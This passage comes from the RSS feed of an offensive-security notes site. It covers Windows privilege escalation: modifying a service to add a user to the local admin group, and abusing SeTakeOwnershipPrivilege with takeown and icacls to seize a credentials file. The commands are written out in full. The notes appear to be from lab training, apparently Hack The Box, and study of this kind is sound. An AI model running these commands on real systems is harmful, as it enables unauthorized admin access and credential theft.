style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://download.sysinternals.com/files/PSTools.zip&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip PSTools.zip&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we can check our permission over this service. All is good&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.\PsService.exe security AppReadiness&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;modify-service&#34;&gt;Modify service&lt;a class=&#34;anchor&#34; href=&#34;#modify-service&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Here we add user &lt;code&gt;server_adm&lt;/code&gt; to local admin group&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/setakeownershipprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/setakeownershipprivilege/</guid>
      <description>&lt;h1 id=&#34;enablealltokenprivs&#34;&gt;EnableAllTokenPrivs&lt;a class=&#34;anchor&#34; href=&#34;#enablealltokenprivs&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/fashionproof/EnableAllTokenPrivs&#34;&gt;Github page&lt;/a&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.\EnableAllTokenPrivs.ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploit&#34;&gt;Exploit&lt;a class=&#34;anchor&#34; href=&#34;#exploit&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;View file privilege&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ChildItem -Path &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Department Shares\Private\IT\cred.txt&amp;#39;&lt;/span&gt; | Select Fullname,LastWriteTime,Attributes,@{Name=&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Owner&amp;#34;&lt;/span&gt;;Expression={ (Get-Acl $_.FullName).Owner }}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmd /c dir /q &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Department Shares\Private\IT&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Take ownership&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;takeown /f &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Department Shares\Private\IT\cred.txt&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Grant ourself full access to the file&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;icacls &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Department Shares\Private\IT\cred.txt&amp;#39;&lt;/span&gt; /grant htb-student&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
  </channel>
